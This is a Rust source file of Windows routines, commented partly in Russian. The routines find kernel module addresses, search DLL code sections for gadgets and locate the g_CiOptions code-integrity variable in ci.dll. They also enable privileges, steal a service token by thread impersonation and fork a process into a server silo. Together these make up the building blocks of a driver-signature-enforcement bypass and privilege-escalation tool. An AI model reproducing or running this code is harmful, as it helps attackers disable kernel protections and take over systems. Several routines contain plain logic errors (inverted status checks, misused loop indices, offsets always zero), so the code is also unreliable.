use winapi::{
    ctypes::c_void,
    shared::{
        basetsd::{PULONG_PTR, SIZE_T, ULONG_PTR}, 
        minwindef::{BOOL, DWORD, FALSE, HMODULE, LPVOID, PBYTE, PDWORD, TRUE, ULONG},
        ntdef::{NTSTATUS, NT_SUCCESS, NULL}, ntstatus::STATUS_PROCESS_CLONED, winerror::ERROR_INSUFFICIENT_BUFFER}, 
    um::{
        errhandlingapi::GetLastError, handleapi::{CloseHandle, INVALID_HANDLE_VALUE}, heapapi::{GetProcessHeap, HeapAlloc, HeapFree}, libloaderapi::{FreeLibrary, GetProcAddress, LoadLibraryExW, DONT_RESOLVE_DLL_REFERENCES}, processthreadsapi::{GetCurrentProcess, GetCurrentThread, GetProcessId, OpenProcessToken, OpenThread, OpenThreadToken, SetThreadToken, LPPROCESS_INFORMATION}, securitybaseapi::{AdjustTokenPrivileges, GetTokenInformation, RevertToSelf}, tlhelp32::{CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32}, winbase::{FormatMessageW, LocalFree, LookupPrivilegeNameW, FORMAT_MESSAGE_ALLOCATE_BUFFER, FORMAT_MESSAGE_FROM_SYSTEM, FORMAT_MESSAGE_IGNORE_INSERTS}, 
        winnt::{SecurityImpersonation, TokenPrivileges, CHAR, HANDLE, HEAP_ZERO_MEMORY, IMAGE_NT_HEADERS, IMAGE_SCN_CNT_CODE, IMAGE_SCN_MEM_EXECUTE, IMAGE_SECTION_HEADER, LANG_NEUTRAL, LONG, LPCSTR, LPCWSTR, LPWSTR, LUID, LUID_AND_ATTRIBUTES, MAKELANGID, MAXIMUM_ALLOWED, PHANDLE, PIMAGE_NT_HEADERS, PIMAGE_SECTION_HEADER, PTOKEN_PRIVILEGES, PVOID, SECURITY_QUALITY_OF_SERVICE, SE_PRIVILEGE_ENABLED, SUBLANG_DEFAULT, THREAD_ALL_ACCESS, THREAD_DIRECT_IMPERSONATION, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY}, winsvc::{CloseServiceHandle, OpenSCManagerW, OpenServiceW, QueryServiceStatusEx, SC_HANDLE, SC_MANAGER_CONNECT, SC_STATUS_PROCESS_INFO, SERVICE_QUERY_STATUS, SERVICE_STATUS_PROCESS}
    },
};

use winapi::shared::ntstatus::STATUS_INFO_LENGTH_MISMATCH;
use windows::Win32::System::Services::{SERVICES_ACTIVE_DATABASE, SERVICES_ACTIVE_DATABASEW};
use windows::Win32::System::Pipes::*;

use std::{
    ffi::CString, mem::zeroed, ptr::{null, null_mut, write_bytes}
};
use ntapi::{
    ntexapi::{NtQuerySystemInformation, SystemModuleInformation},
    ntldr::{PRTL_PROCESS_MODULES, RTL_PROCESS_MODULE_INFORMATION}, 
    ntpsapi::{NtCreateUserProcess, NtImpersonateThread, PPS_ATTRIBUTE_LIST, PS_ATTRIBUTE_LIST, PS_CREATE_INFO, PS_ATTRIBUTE, PS_ATTRIBUTE_JOB_LIST, PROCESS_CREATE_FLAGS_INHERIT_HANDLES}, 
    ntrtl::RtlImageNtHeader
};
use crate::common::{commons, nt::{self, STATUS_SUCCESS}};
use crate::common::ipc;
use crate::common::IpcClient;
use crate::common::IpcServer;
pub const PAGE_SIZE: usize = 0x1000; 


pub struct Common {
    Name: [CHAR; 9],
    VirtualAddress: DWORD,
    VirtualSize: DWORD,
    Characteristics: DWORD,
}

#[derive(Clone)]
pub struct ImageSectionHeaderInfo{
    Name: [u8; 8],
    VirtualAddress: DWORD,
    VirtualSize: DWORD,
    Characteristics: DWORD,
}

impl Common {
    pub fn print_system_error(error_code: DWORD){
        let mut pwsz_error_message: LPWSTR = null_mut();
        unsafe{FormatMessageW(
            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            null(),
            error_code,
            MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT) as u32,
            pwsz_error_message as LPWSTR,
            0,
            null_mut()
            );
        };

        if !pwsz_error_message.is_null() {
            eprintln!("ERROR::{:?}", pwsz_error_message);
            unsafe{LocalFree(&mut pwsz_error_message as *mut _ as *mut c_void);};
        }else {
            eprintln!("ERROR::FORMAT::MASSAGE_W");
        }
    }

    pub fn Alloc(size: SIZE_T) -> LPVOID {
        unsafe {
            let mut lp_mem: LPVOID;
            lp_mem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
            
            if lp_mem.is_null() {
                eprintln!("ERROR::HEAP::ALLOC");
                return Default::default();
            }
            return lp_mem;
        };
    }

    pub fn Free(mem: LPVOID) -> BOOL{
        unsafe {
            if HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, mem) == 0{
                eprint!("ERROR::HEAP::FREE");
                return FALSE;
            };
            return TRUE;
        };
    }

    pub fn FindKernelModuleBaseAddress(module_name: LPCSTR, module_address: PULONG_PTR) -> BOOL {
        let mut b_result: BOOL = FALSE;
        let mut status: NTSTATUS;
        let mut size: ULONG = 0;
        let mut p_module: PRTL_PROCESS_MODULES = null_mut();
        unsafe{

            status = NtQuerySystemInformation(SystemModuleInformation, null_mut(), 0, size as *mut _);
            if status != STATUS_INFO_LENGTH_MISMATCH {
                eprint!("ERROR::SYSTEM::QUERY::INFO::{:?}", status);
                return b_result;
            }

            p_module = Common::Alloc(size as usize) as PRTL_PROCESS_MODULES;
            if p_module.is_null() {
                if !p_module.is_null() {Common::Free(&mut p_module as *mut _ as *mut c_void);};
                return b_result;
            };

            status = NtQuerySystemInformation(SystemModuleInformation, p_module as *mut c_void, size, size as *mut _);
            if NT_SUCCESS(status){
                eprint!("ERROR::SYSTEM::QUERY::INFO::{:?}", status);
                if !p_module.is_null() {Common::Free(&mut p_module as *mut _ as *mut c_void);};
                return b_result;
            }

            let mut i: ULONG = 0;
            for i in 0.. (*p_module).NumberOfModules {
                let mut module: RTL_PROCESS_MODULE_INFORMATION = (*p_module).Modules[i as usize];
                
                if std::ffi::CStr::from_ptr(module.FullPathName.as_ptr().add(module.OffsetToFileName as usize) as *const i8).to_string_lossy().eq_ignore_ascii_case(std::ffi::CStr::from_ptr(module_name).to_str().unwrap()){
                    *module_address = module.ImageBase as ULONG_PTR;
                    b_result = TRUE;
                    break;
                };
            };

            if b_result == FALSE {
                eprint!("ERROR::ADRESS:KERNEL_MODULE::{:?}", module_name);
            }

            if !p_module.is_null() {Common::Free(&mut p_module as *mut _ as *mut c_void);};
            return b_result;
        };
    }


    pub fn EnumModuleSections(module: HMODULE, mut secion_list: &mut Vec<ImageSectionHeaderInfo>) -> BOOL{
        let mut b_result: BOOL = FALSE;
        const dw_buffer_size: DWORD = 0x1000;
        let mut pnt_headers: PIMAGE_NT_HEADERS = null_mut();
        let mut psection_header: PIMAGE_SECTION_HEADER;
        let mut pbuffer: PBYTE = null_mut();
        unsafe{
            secion_list.clear();

            pbuffer = Common::Alloc(dw_buffer_size as usize) as *mut u8;
            if pbuffer.is_null() {
                if !pbuffer.is_null() {Common::Free(pbuffer as *mut c_void);};
                return b_result;
            };

            pnt_headers =  RtlImageNtHeader(module as *mut c_void);
            if pnt_headers.is_null(){
                if !pbuffer.is_null() {Common::Free(pbuffer as *mut c_void);};
                return b_result;
            };

            let mut i: DWORD = 0;
            for i in 0..(*pnt_headers).FileHeader.NumberOfSections{
                use std::mem::{size_of};

                let section_ptr = unsafe {
                    (pnt_headers as *const u8)
                        .add(size_of::<IMAGE_NT_HEADERS>() + i as usize * size_of::<IMAGE_SECTION_HEADER>())
                        as *const IMAGE_SECTION_HEADER
                };

                psection_header = section_ptr as *mut _;

                let mut ish: ImageSectionHeaderInfo = zeroed();

                write_bytes(ish.Name.as_mut_ptr(), 0,ish.Name.len());
                ish.Name = (*psection_header).Name;

                let virtual_size = unsafe { *(*psection_header).Misc.VirtualSize() };
                (ish).VirtualAddress =  (*psection_header).VirtualAddress;
                (ish).VirtualSize =  virtual_size;
                (ish).Characteristics =  (*psection_header).Characteristics;

                secion_list.push(ish);
            }

            b_result = (secion_list.len() == (*pnt_headers).FileHeader.NumberOfSections as usize) as BOOL;

            if !pbuffer.is_null() {Common::Free(pbuffer as *mut c_void);};
            return b_result;
        }
    }


    pub fn FindModuleSection(module: HMODULE, section_name: LPCSTR, section: ImageSectionHeaderInfo) -> BOOL {
        let mut b_result: BOOL = FALSE;
        let mut section: Vec<ImageSectionHeaderInfo> = unsafe {zeroed()};
        unsafe {
            let mut res_: BOOL = Common::EnumModuleSections(module, &mut section);
            if res_ == 0 {
                if b_result == FALSE {eprint!("ERROR::N_FOUND_SECTION::{:?}::IN::{:?}", section_name, module as ULONG_PTR);};
                return b_result;
            };

            for s_section in &section {
                let s1 = std::ffi::CStr::from_ptr(section_name).to_string_lossy();
                let s2 = std::ffi::CStr::from_ptr(s_section.Name.as_ptr() as *const i8).to_string_lossy();

                if s1.eq_ignore_ascii_case(&s2) {
                    section.push(s_section.clone()); // предполагается #[derive(Clone)]
                    b_result = TRUE;
                    break;
                }
            }

            if b_result == FALSE {eprint!("ERROR::N_FOUND_SECTION::{:?}::IN::{:?}", section_name, module as ULONG_PTR);};
            return b_result;
        }
    }


    pub fn IsWritableAddress(module: HMODULE, address: ULONG_PTR) -> BOOL {
        let mut b_result: BOOL = FALSE;
        let mut sections: Vec<ImageSectionHeaderInfo> = unsafe{zeroed()};
        let mut psection_start: ULONG_PTR;
        let mut psection_end: ULONG_PTR;

        let res_: BOOL = Common::EnumModuleSections(module, &mut sections) as _;
        if res_ == FALSE{
            return b_result;
        };

        for section in sections {
            psection_start = module as ULONG_PTR + section.VirtualAddress as usize;
            psection_end = psection_start + section.VirtualSize as usize;

            if address >= psection_start && address < psection_end {
                b_result = TRUE;
                break;
            }
        }
        return b_result;
    }


    pub fn FindPatternOffset(buffer: LPVOID, buffer_size: DWORD, pattern: PBYTE, pattern_size: DWORD, mut pattern_offset: PDWORD) -> BOOL {
        let mut b_result: BOOL = FALSE;
        let mut pcurrent_address: PVOID = null_mut();
        unsafe{
            *pattern_offset = 0;

            for i in 0..(buffer_size - pattern_size){
                pcurrent_address = (buffer as *mut u8).add(i as usize) as LPVOID;

                if std::slice::from_raw_parts(pcurrent_address as *const u8, pattern_size as usize) == std::slice::from_raw_parts(pattern as *const u8, pattern_size as usize) {
                    *pattern_offset = 0;
                    b_result = TRUE;
                    break;
                }
            }

            return b_result;
        }
    }


    pub fn FindGadgetOffset(module: HMODULE, gadget: PBYTE, gadget_size: DWORD, mut gadget_offset: PDWORD) -> BOOL {
        let mut b_result: BOOL = FALSE; 
        let mut h_module: HMODULE = null_mut();
        let mut psection_address: ULONG_PTR;
        let mut sections: Vec<ImageSectionHeaderInfo> = unsafe{zeroed()};
        let mut dw_pattern_offset: DWORD = 0;
        unsafe{
        *gadget_offset = 0;
        unsafe {
                h_module = LoadLibraryExW(module as *const u16, NULL, DONT_RESOLVE_DLL_REFERENCES);
                if h_module.is_null() {
                    eprintln!("ERROR::LOAD::LIBRARY");
                    if !h_module.is_null() {FreeLibrary(h_module);};
                    if b_result == FALSE {eprintln!("ERROR::FOUND::GADGET::SIZE::{:?}::IN::{:?}", gadget_size, module);};
                    return b_result;
                }
                
                let res_: BOOL = Common::EnumModuleSections(h_module, &mut sections);
                if res_ == FALSE {
                    if !h_module.is_null() {FreeLibrary(h_module);};
                    if b_result == FALSE {eprintln!("ERROR::FOUND::GADGET::SIZE::{:?}::IN::{:?}", gadget_size, module);};
                    return b_result;
                }

                for section in sections {
                    if !section.Characteristics == 0 & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE) {
                        psection_address = (h_module as *mut u8).add(section.VirtualAddress as usize) as ULONG_PTR;
                        
                        let res_: BOOL = Common::FindPatternOffset(psection_address as *mut c_void, section.VirtualSize as u32, gadget, gadget_size, &mut dw_pattern_offset as *mut u32);
                        if res_ == FALSE {
                            *gadget_offset = section.VirtualAddress + dw_pattern_offset;
                            b_result = TRUE;
                            break;
                        }
                    }
                }

                if !h_module.is_null() {FreeLibrary(h_module);};
                if b_result == FALSE {eprintln!("ERROR::FOUND::GADGET::SIZE::{:?}::IN::{:?}", gadget_size, module);};
                return b_result;
            }
        }
    }


    pub fn FindCIOptinOffset(mut offset: PDWORD) -> BOOL{
        let mut b_result: BOOL = FALSE;
        let mut h_module: HMODULE = null_mut();
        let mut section = unsafe{ zeroed::<ImageSectionHeaderInfo>()};
        let mut pci_initialize: PVOID = null_mut();
        unsafe{
            *offset = 0;
            let str_: Vec<u16> = "ci.dll".encode_utf16().chain(std::iter::once(0)).collect();

            h_module = LoadLibraryExW(str_.as_ptr(), NULL, DONT_RESOLVE_DLL_REFERENCES);
            if h_module.is_null() {
                eprintln!("ERROR::LOAD::LIBRARY");
                if !h_module.is_null() {FreeLibrary(h_module);};
                if b_result == FALSE {eprintln!("ERROR::N_FOUND::g_CiOptions::'ci.dll'")};
                return b_result;
            }

            let str_ = CString::new(".text").unwrap();
            let res_: BOOL = Common::FindModuleSection(h_module, str_.as_ptr(), section);
            if res_ == FALSE {
                if !h_module.is_null() {FreeLibrary(h_module);};
                if b_result == FALSE {eprintln!("ERROR::N_FOUND::g_CiOptions::'ci.dll'")};
                return b_result;
            };
            
            let str_ = CString::new("CiInitialize").unwrap();
            let raw_ptr = GetProcAddress(h_module, str_.as_ptr());

            pci_initialize = raw_ptr as *mut c_void;
            if pci_initialize.is_null() {
                eprintln!("ERROR::GET::PROC::ADDRESS");
                if !h_module.is_null() {FreeLibrary(h_module);};
                if b_result == FALSE {eprintln!("ERROR::N_FOUND::g_CiOptions::'ci.dll'")};
                return b_result;
            };


            for i in 0..128 {
                let mut lrelative_offset: LONG = 0;
                let mut pcall_target: ULONG_PTR;
                let mut pci_options: ULONG_PTR;

                let byte = *((pci_initialize as *mut u8).add(i));
                if byte == 0xe8{
                    let src = (pci_initialize as *const u8).add(i + 1);
                    let dst = &mut lrelative_offset as *mut i32 as *mut u8;
                    std::ptr::copy_nonoverlapping(src, dst, std::mem::size_of::<i32>());
                                    
                    let bytefive = *((pci_initialize as *mut u8).add(i + 5));
                    let target_byte = *((pci_initialize as *mut u8).add(bytefive as usize));
                    pcall_target = (target_byte as LONG + lrelative_offset) as ULONG_PTR;

                    for j in 0..128 {
                        let byte = *((pcall_target as *mut u8).add(i));
                        let bytetwo = *((pcall_target as *mut u8).add(i + 1));

                        if byte == 0x89 && bytetwo == 0x0d{
                            let src = (pcall_target as *const u8).add(i + 1);
                            let dst = &mut lrelative_offset as *mut i32 as *mut u8;
                            std::ptr::copy_nonoverlapping(src, dst, std::mem::size_of::<i32>());

                            let byte = *((pcall_target as *mut u8).add(i + 6));
                            pci_options = (byte + lrelative_offset as u8) as usize;

                            let res_: BOOL = Common::IsWritableAddress(h_module, pci_options);
                            if res_ == FALSE{
                                *offset = ((pci_options as usize) - (h_module as usize)) as u32;
                                b_result = TRUE;
                            }else {
                                eprintln!("ERROR::ADDRESS::{}::NOT_WRITABLE", pci_options);
                            }
                        }

                        if *offset != 0 {break;};
                    }
                };
                
                if *offset != 0 {break;};
            } 

            eprintln!("ERROR::GET::PROC::ADDRESS");
            if !h_module.is_null() {FreeLibrary(h_module);};
            if b_result == FALSE {eprintln!("ERROR::N_FOUND::g_CiOptions::'ci.dll'")};
            return b_result;
        }
    }



        pub fn EnablePrivilege(token: HANDLE, privilege: LPWSTR) -> BOOL {
        let mut b_result: BOOL = FALSE;
        let mut h_token: HANDLE = token;
        let mut bprivilege_found: BOOL = FALSE;
        let mut ptoken_privileges: PTOKEN_PRIVILEGES = null_mut();
        let mut pwsz_privilege_name_temp: LPWSTR = null_mut();

        unsafe {
            // Получаем токен, если он не передан
            if h_token.is_null() {
                let success = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &mut h_token);
                if success == FALSE {
                    eprintln!("ERROR::PROCESS::TOKEN");
                    eprintln!("ERROR::ENABLE::PRIVILEGE:::::1");
                    return FALSE;
                }
            }

            // Получаем размер буфера
            let mut dw_token_info_size: DWORD = 0;
            let success = GetTokenInformation(h_token, TokenPrivileges, null_mut(), 0, &mut dw_token_info_size);
            if success == FALSE && GetLastError() != ERROR_INSUFFICIENT_BUFFER {
                eprintln!("ERROR::GET_TOKEN_INFORMATION");
                eprintln!("ERROR::ENABLE::PRIVILEGE::::::::2");
                if token.is_null() && !h_token.is_null() {
                    CloseHandle(h_token);
                }
                return FALSE;
            }

            // Выделяем память под TOKEN_PRIVILEGES
            ptoken_privileges = Common::Alloc(dw_token_info_size as usize) as PTOKEN_PRIVILEGES;
            if ptoken_privileges.is_null() {
                eprintln!("ERROR::ENABLE::PRIVILEGE::::::::3");
                if token.is_null() && !h_token.is_null() {
                    CloseHandle(h_token);
                }
                return FALSE;
            }

            // Получаем привилегии
            let success = GetTokenInformation(
                h_token,
                TokenPrivileges,
                ptoken_privileges as *mut _,
                dw_token_info_size,
                &mut dw_token_info_size,
            );
            if success == FALSE {
                eprintln!("ERROR::GET_TOKEN_INFORMATION");
                eprintln!("ERROR::ENABLE::PRIVILEGE:::::::::4");
                Common::Free(ptoken_privileges as *mut c_void);
                if token.is_null() && !h_token.is_null() {
                    CloseHandle(h_token);
                }
                return FALSE;
            }

            // Перебираем привилегии
            for i in 0..(*ptoken_privileges).PrivilegeCount {
                let privileges_ptr = (*ptoken_privileges).Privileges.as_ptr();
                let mut luid_attr = *privileges_ptr.add(i as usize);

                // Узнаём размер имени
                let mut dw_name_len: DWORD = 0;
                LookupPrivilegeNameW(
                    null_mut(),
                    &mut luid_attr.Luid as *mut _,
                    null_mut(),
                    &mut dw_name_len,
                );
                if GetLastError() != ERROR_INSUFFICIENT_BUFFER {
                    eprintln!("ERROR::LookupPrivilegeNameW first call failed with unexpected error: {}", GetLastError());
                    continue;
                }


                // Выделяем память под имя
                pwsz_privilege_name_temp = Common::Alloc((dw_name_len as usize) * 2) as LPWSTR;
                if pwsz_privilege_name_temp.is_null() {
                    continue;
                }

                let success = LookupPrivilegeNameW(
                    null_mut(),
                    &luid_attr.Luid as *const _ as *mut _,
                    pwsz_privilege_name_temp,
                    &mut dw_name_len,
                );
                if success == FALSE {
                    eprintln!("ERROR::LOOKUP::PRIVILEGE::NAME");
                    Common::Free(pwsz_privilege_name_temp as *mut c_void);
                    continue;
                }

                // Сравнение с требуемым именем
                let s1 = {
                    let len = (0..).take_while(|&i| *pwsz_privilege_name_temp.add(i) != 0).count();
                    String::from_utf16_lossy(std::slice::from_raw_parts(pwsz_privilege_name_temp, len))
                };
                let s2 = {
                    let len = (0..).take_while(|&i| *privilege.add(i) != 0).count();
                    String::from_utf16_lossy(std::slice::from_raw_parts(privilege, len))
                };

                Common::Free(pwsz_privilege_name_temp as *mut c_void);
                pwsz_privilege_name_temp = null_mut();

                println!("s1: {:?} and s2: {:?}", s1 , s2);
                if s1.eq_ignore_ascii_case(&s2) {
                    bprivilege_found = TRUE;

                    let mut tp: TOKEN_PRIVILEGES = zeroed();
                    tp.PrivilegeCount = 1;
                    tp.Privileges[0].Luid = luid_attr.Luid;
                    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

                    let success = AdjustTokenPrivileges(
                        h_token,
                        FALSE,
                        &mut tp,
                        std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
                        null_mut(),
                        null_mut(),
                    );
                    if success == TRUE {
                        b_result = TRUE;
                    } else {
                        eprintln!("ERROR::ADJUCT_TOKEN_PRIVILEGES");
                    }
                    break;
                }
            }

            if bprivilege_found == FALSE {
                eprintln!("ERROR::ENABLE::PRIVILEGE:::::::::5");
            }

            if !ptoken_privileges.is_null() {
                Common::Free(ptoken_privileges as *mut c_void);
            }
            if token.is_null() && !h_token.is_null() {
                CloseHandle(h_token);
            }
        }
        eprintln!("FINALE RESULT : {:?}", b_result);
        b_result
    }

    pub fn QueryServiceProcessId(service: LPCWSTR, mut process_id: PDWORD) -> BOOL {
        let mut b_result: BOOL = FALSE;
        let mut h_scm: SC_HANDLE = null_mut();
        let mut h_service: SC_HANDLE = null_mut();
        let mut dw_bytes_needed: DWORD = 0;
        let mut spp: SERVICE_STATUS_PROCESS = unsafe{zeroed()};
        unsafe{
            *process_id = 0;

            h_scm = OpenSCManagerW(null_mut(), SERVICES_ACTIVE_DATABASE.as_ptr(), SC_MANAGER_CONNECT);
            if h_scm.is_null(){
                eprintln!("ERROR::OPEN_SCManagerW::1");
                if !h_service.is_null() {CloseServiceHandle(h_service);};
                if !h_scm.is_null() {CloseServiceHandle(h_scm);};
                return b_result;
            }

            h_service = OpenServiceW(h_scm, service, SERVICE_QUERY_STATUS);
            if h_service.is_null() {
                eprintln!("ERROR::OPEN_ServiceW::2");
                if !h_service.is_null() {CloseServiceHandle(h_service);};
                if !h_scm.is_null() {CloseServiceHandle(h_scm);};
                return b_result;
            }

            let res_: BOOL = QueryServiceStatusEx(h_service, SC_STATUS_PROCESS_INFO, &mut spp as *mut SERVICE_STATUS_PROCESS as *mut u8, std::mem::size_of_val(&spp) as u32, &mut dw_bytes_needed as *mut u32);
            if res_ == FALSE {
                eprintln!("ERROR::QUERY_ServiceStatus");
                if !h_service.is_null() {CloseServiceHandle(h_service);};
                if !h_scm.is_null() {CloseServiceHandle(h_scm);};
                return b_result;
            }

            *process_id = spp.dwProcessId;
            b_result = TRUE;

            if !h_service.is_null() {CloseServiceHandle(h_service);};
            if !h_scm.is_null() {CloseServiceHandle(h_scm);};
            return b_result;
        }
    }


    pub fn OpenServiceToken(service: LPCWSTR, token: PHANDLE) -> BOOL {
        let mut b_result: BOOL = FALSE;
        let mut b_impresonation: BOOL = FALSE;
        let mut status: NTSTATUS;
        let mut dw_service_pid: DWORD = 0;
        let mut h_thread: HANDLE = NULL;
        let mut h_token: HANDLE = NULL;
        let mut h_snapsho: HANDLE = INVALID_HANDLE_VALUE;
        let mut the: THREADENTRY32 = unsafe{zeroed()};
        let mut sqos: SECURITY_QUALITY_OF_SERVICE = unsafe{zeroed()};

        unsafe{
            *token = NULL;
            let res_:BOOL = Common::QueryServiceProcessId(service, &mut dw_service_pid as *mut u32);
            if res_ == FALSE{
                if b_result == FALSE && !h_token.is_null() {CloseHandle(h_token);};
                if b_impresonation == TRUE {RevertToSelf();};
                if !h_thread.is_null() {CloseHandle(h_thread);};
                if !h_snapsho.is_null() && h_snapsho != INVALID_HANDLE_VALUE {CloseHandle(h_snapsho);};
                return b_result;
            }

            h_snapsho = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if h_snapsho == INVALID_HANDLE_VALUE {
                eprintln!("ERROR::H_SNAPSHOT::INIT");
                if b_result == FALSE && !h_token.is_null() {CloseHandle(h_token);};
                if b_impresonation == TRUE {RevertToSelf();};
                if !h_thread.is_null() {CloseHandle(h_thread);};
                if !h_snapsho.is_null() && h_snapsho != INVALID_HANDLE_VALUE {CloseHandle(h_snapsho);};
                return b_result;
            }

            the.dwSize = std::mem::size_of_val(&the)as u32;

            if Thread32First(h_snapsho, &mut the) == FALSE{
                eprintln!("ERROR::THREAD_32_FIRST");
                if b_result == FALSE && !h_token.is_null() {CloseHandle(h_token);};
                if b_impresonation == TRUE {RevertToSelf();};
                if !h_thread.is_null() {CloseHandle(h_thread);};
                if !h_snapsho.is_null() && h_snapsho != INVALID_HANDLE_VALUE {CloseHandle(h_snapsho);};
                return b_result;
            }

            loop {
                /*println!("THREAD ID = {}, OWNER PID = {}", the.th32ThreadID, the.th32OwnerProcessID);*/
                if the.th32OwnerProcessID == dw_service_pid{
                    h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, the.th32ThreadID);
                    
                    if !h_thread.is_null(){
                        break;
                    }
                }

                if Thread32Next(h_snapsho,  &mut the as *mut THREADENTRY32) == FALSE{
                    break;
                }
            }

            if h_thread.is_null(){
                eprintln!("ERROR::OPEN::THREAD");
                if b_result == FALSE && !h_token.is_null() {CloseHandle(h_token);};
                if b_impresonation == TRUE {RevertToSelf();};
                if !h_thread.is_null() {CloseHandle(h_thread);};
                if !h_snapsho.is_null() && h_snapsho != INVALID_HANDLE_VALUE {CloseHandle(h_snapsho);};
                return b_result;
            }

            sqos.Length = std::mem::size_of_val(&sqos) as u32;
            sqos.ImpersonationLevel = SecurityImpersonation;

            status = NtImpersonateThread(GetCurrentThread(), h_thread, &mut sqos as *mut _);
            if !NT_SUCCESS(status){
                eprintln!("ERROR::IMPERSONATE::THREAD");
                if b_result == FALSE && !h_token.is_null() {CloseHandle(h_token);};
                if b_impresonation == TRUE {RevertToSelf();};
                if !h_thread.is_null() {CloseHandle(h_thread);};
                if !h_snapsho.is_null() && h_snapsho != INVALID_HANDLE_VALUE {CloseHandle(h_snapsho);};
                return b_result;
            }

            b_impresonation = TRUE;

            let res_:BOOL = OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, FALSE, &mut h_token as *mut *mut c_void);
            if res_ == FALSE{
                eprintln!("ERROR::OPEN_THREAD::TOKEN");
                if b_result == FALSE && !h_token.is_null() {CloseHandle(h_token);};
                if b_impresonation == TRUE {RevertToSelf();};
                if !h_thread.is_null() {CloseHandle(h_thread);};
                if !h_snapsho.is_null() && h_snapsho != INVALID_HANDLE_VALUE {CloseHandle(h_snapsho);};
                return b_result;
            }

            *token = h_token;
            b_result = TRUE;

            if b_result == FALSE && !h_token.is_null() {CloseHandle(h_token);};
                if b_impresonation == TRUE {RevertToSelf();};
                if !h_thread.is_null() {CloseHandle(h_thread);};
                if !h_snapsho.is_null() && h_snapsho != INVALID_HANDLE_VALUE {CloseHandle(h_snapsho);};
                return b_result;
        }
    }


    pub fn ImpresonateToken(token: HANDLE) -> BOOL{
        unsafe{
            let mut h_thread: HANDLE = GetCurrentThread(); 
            let res_:BOOL = !SetThreadToken(&mut h_thread as *mut *mut c_void, token);
            if res_ == FALSE{
                eprintln!("ERROR::SET_THREAD::TOKEN");
                return FALSE;
            }

            return TRUE;
        }
    }


    pub unsafe fn RevertImpresonation() -> BOOL {
        if RevertToSelf() == FALSE{
            eprintln!("ERROR::REVERT_TO::SELF");
            return FALSE;
        }
        return TRUE;
    }


    pub fn ForkProcessIntoServerSilo(server_silo: HANDLE, mut process_information: LPPROCESS_INFORMATION) -> BOOL{
        let mut b_result: BOOL = FALSE;
        let mut status: NTSTATUS;
        let mut h_job_list: [HANDLE; 1] = [null_mut() as *mut c_void; 1];
        let mut h_process: HANDLE = null_mut();
        let mut h_thread: HANDLE = null_mut();
        let mut ci: PS_CREATE_INFO = unsafe{zeroed()};
        let mut p_attribute_list: PPS_ATTRIBUTE_LIST = null_mut();
        const dw_attribute_count: DWORD = 1;
        const attribute_list_size: SIZE_T = std::mem::size_of::<PS_ATTRIBUTE_LIST>() + (dw_attribute_count as usize) - 1 * std::mem::size_of::<PS_ATTRIBUTE>();
        unsafe {
            /*process_information = 0;*/
            ci.Size = std::mem::size_of_val(&ci);

            p_attribute_list = Common::Alloc(attribute_list_size) as *mut PS_ATTRIBUTE_LIST;
            if p_attribute_list.is_null(){
                if !p_attribute_list.is_null() {Common::Free(p_attribute_list as *mut c_void);};
                return b_result;
            }
            h_job_list[0] = server_silo;

            (*p_attribute_list).TotalLength = attribute_list_size;
            (*p_attribute_list).Attributes[0].Attribute = PS_ATTRIBUTE_JOB_LIST;
            (*p_attribute_list).Attributes[0].Size = std::mem::size_of_val(&h_job_list);
            (*p_attribute_list).Attributes[0].u.ValuePtr = h_job_list[0];
            println!("H Job List is {:?} but full is {:?}", h_job_list[0], &h_job_list);

            status = NtCreateUserProcess(&mut h_process as *mut *mut c_void, &mut h_thread as *mut *mut c_void, MAXIMUM_ALLOWED, MAXIMUM_ALLOWED, null_mut(), null_mut(), PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0, NULL, &mut ci, p_attribute_list);
            if !NT_SUCCESS(status){
                eprintln!("ERROR::CREATE::USER::PROCESS");
                if !p_attribute_list.is_null() {Common::Free(p_attribute_list as *mut c_void);};
                return b_result;
            }

            if status == STATUS_SUCCESS {
                (*process_information).hProcess = h_process;
                (*process_information).hThread = h_thread;
                (*process_information).dwProcessId = GetProcessId(h_process);
                (*process_information).dwThreadId = GetProcessId(h_process);
            }else if status == STATUS_PROCESS_CLONED{
                b_result = TRUE;
            }else{
                eprintln!("ERROR::UNEXPECTED_STATUS_CODE::{:?}", status);
            }
            
            if !p_attribute_list.is_null() {Common::Free(p_attribute_list as *mut c_void);};
            return b_result;
        }
    }
}

